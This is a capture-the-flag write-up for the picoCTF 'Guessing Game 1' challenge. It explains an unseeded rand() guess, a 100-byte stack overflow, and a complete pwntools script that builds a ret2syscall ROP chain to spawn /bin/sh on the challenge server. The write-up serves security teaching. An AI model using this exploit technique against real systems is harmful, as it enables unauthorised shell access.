# CyLab / picoCTF — Guessing Game 1

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Static Ret2syscall)  
* **Difficulty:** Medium (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `ROPgadget`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`vuln`) — Statically Linked, Non-PIE  

---

## TL;DR

A classic statically linked 64-bit binary exploitation challenge demonstrating unseeded PRNG prediction and **ret2syscall ROP chain construction**. The program asks the user to guess a random integer between 1 and 100. Because `rand()` is called without initializing an entropy seed via `srand()`, the PRNG sequence is completely deterministic: the first target number is always `(rand() % 100) + 1 = 84`. Correctly guessing 84 invokes `win()`, where an unbounded `fgets(winner, 360, stdin)` overflows a 100-byte stack buffer. Because the binary is statically linked, there are no dynamic library dependencies to leak. Instead, we use native gadgets in `.text` to construct a two-stage `ret2syscall` chain: first executing `read(0, .bss, 16)` to stage `"/bin/sh\0"`, followed by `execve(.bss, 0, 0)` via `syscall` to spawn an interactive shell.

---

## Recon

We inspect the binary's properties and exploit mitigations using `file` and `checksec`:

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, not stripped

$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found (Libc symbols only)
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
* **File Type:** ELF 64-bit LSB, **statically linked**, not stripped.
* **Statically Linked Advantage:** Although dynamic libraries cannot be leaked, all standard C library functions and thousands of assembly gadgets reside directly within the binary's static address space (`0x400000`..`0x4C0000`).
* **PIE:** `No PIE (0x400000)` — All gadget addresses are constant.
* **Canary Note:** While `checksec` detects `__stack_chk_fail` symbols embedded in the statically linked C library, `win()` does not implement stack canary verification in its prologue/epilogue.

---

## Static Analysis & Vulnerability

### 1. PRNG Determinism in `main()`

Inspecting `main()` in IDA Pro:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int secret = rand() % 100 + 1; // Unseeded rand()! Default seed is 1
  puts("What number would you like to guess?");
  scanf("%d", &guess);
  if ( guess == secret )
    win();
  ...
}
```
Because `srand()` is never called, glibc's linear congruential generator uses default seed `1`. Evaluating `(rand() % 100) + 1` in C or Python ctypes consistently produces **`84`**.

### 2. Stack Buffer Overflow in `win()`

Examining `win()`:
```c
void win()
{
  char winner[100]; // [rsp+0h] [rbp-70h] BYREF

  puts("Congrats! You win! Your prize is this message and a chance to guess again!");
  printf("New winner name? ");
  fgets(winner, 360, stdin); // Reads 360 bytes into 100-byte buffer!
}
```

### 3. Stack Memory Layout

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [rbp - 0x70] (Start of winner: 100 bytes)
  |                                   |
  |     winner buffer (100 bytes)     |
  |     Stack alignment padding (12B) |
  |                                   |
  +-----------------------------------+  <- [rbp] (Saved RBP: 8 bytes)
  |     Saved RBP (8 bytes)           |
  +-----------------------------------+  <- [rbp + 0x08] (Saved RIP)
  |     Return Address (Saved RIP)    |  <- Overwritten with ROP Chain!
  +-----------------------------------+
  Higher Memory Addresses
```

- Offset to `saved RIP`:
  $$\text{Offset} = 0x70 + 0x08 = 0x78 = 120 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. Gadget Harvesting (`ROPgadget`)
Searching `vuln` for 64-bit Linux syscall calling conventions (`RAX=sys_num, RDI=arg0, RSI=arg1, RDX=arg2`):
* `POP_RAX = 0x4518e7` (`pop rax ; ret`)
* `POP_RDI = 0x40206f` (`pop rdi ; ret`)
* `POP_RSI = 0x40a0de` (`pop rsi ; ret`)
* `POP_RDX_RBX = 0x486bbb` (`pop rdx ; pop rbx ; ret`)
* `SYSCALL = 0x41b406` (`syscall ; ret` — scanned byte sequence `0f 05 c3`)
* Writable `.bss` segment: `BSS_ADDR = 0x6bc3a0`

### 2. Constructing the Two-Stage Ret2syscall ROP Chain

#### Stage 1: Write `"/bin/sh\0"` into `.bss`
Call `read(0, BSS_ADDR, 16)`:
```python
rop = b"A" * 120
# read(rdi=0, rsi=BSS_ADDR, rdx=16)
rop += p64(POP_RAX) + p64(0)                    # sys_read (0)
rop += p64(POP_RDI) + p64(0)                    # fd: stdin (0)
rop += p64(POP_RSI) + p64(BSS_ADDR)             # buf: .bss
rop += p64(POP_RDX_RBX) + p64(16) + p64(0)      # count: 16 bytes
rop += p64(SYSCALL)
```

#### Stage 2: Invoke `execve("/bin/sh", 0, 0)`
```python
# execve(rdi=BSS_ADDR, rsi=0, rdx=0)
rop += p64(POP_RAX) + p64(59)                   # sys_execve (59)
rop += p64(POP_RDI) + p64(BSS_ADDR)             # filename: .bss ("/bin/sh")
rop += p64(POP_RSI) + p64(0)                    # argv: NULL
rop += p64(POP_RDX_RBX) + p64(0) + p64(0)       # envp: NULL
rop += p64(SYSCALL)
```

---

## Exploit

We construct the complete exploit in Python:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Guessing Game 1
Exploit: PRNG prediction (guess 84) + Static Ret2syscall ROP chain
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

EXE = "./vuln"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 90)

POP_RAX = 0x4518e7
POP_RDI = 0x40206f
POP_RSI = 0x40a0de
POP_RDX_RBX = 0x486bbb
SYSCALL = 0x41b406
BSS_ADDR = 0x6bc3a0

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # 1. Answer PRNG guess (84 is default unseeded rand() % 100 + 1)
    p.recvuntil(b"What number would you like to guess?\n")
    p.sendline(b"84")

    # 2. Build Stage 1 (read string) & Stage 2 (execve) ROP chain
    p.recvuntil(b"New winner name? ")
    rop = b"A" * 120

    # read(0, .bss, 16)
    rop += p64(POP_RAX) + p64(0)
    rop += p64(POP_RDI) + p64(0)
    rop += p64(POP_RSI) + p64(BSS_ADDR)
    rop += p64(POP_RDX_RBX) + p64(16) + p64(0)
    rop += p64(SYSCALL)

    # execve(.bss, 0, 0)
    rop += p64(POP_RAX) + p64(59)
    rop += p64(POP_RDI) + p64(BSS_ADDR)
    rop += p64(POP_RSI) + p64(0)
    rop += p64(POP_RDX_RBX) + p64(0) + p64(0)
    rop += p64(SYSCALL)

    p.sendline(rop)

    # 3. Supply "/bin/sh\x00" to stage 1 read()
    p.sendline(b"/bin/sh\x00")

    # 4. Interactive shell
    p.interactive()

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Submitting the guess and ROP chain triggers the syscall execution and drops into a shell:

```text
[+] Opening connection to xebec.cylabacademy.net on port 90: Done
[*] Switching to interactive mode
$ cat flag.txt
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Unseeded Randomness Is Deterministic**: Calling `rand()` without `srand()` always executes with seed `1`, resulting in completely reproducible pseudo-random outputs across executions.
2. **Static Binaries are ROP Paradises**: Because statically linked binaries package the entire standard C runtime into `.text`, they contain an abundance of gadgets, eliminating the need to leak dynamic library addresses.
3. **Staging Strings into Writable Memory (`.bss`)**: When a binary lacks embedded command strings like `"/bin/sh"`, chaining a `read()` syscall to stage the string into writable `.bss` prior to invoking `execve()` provides a clean solution.
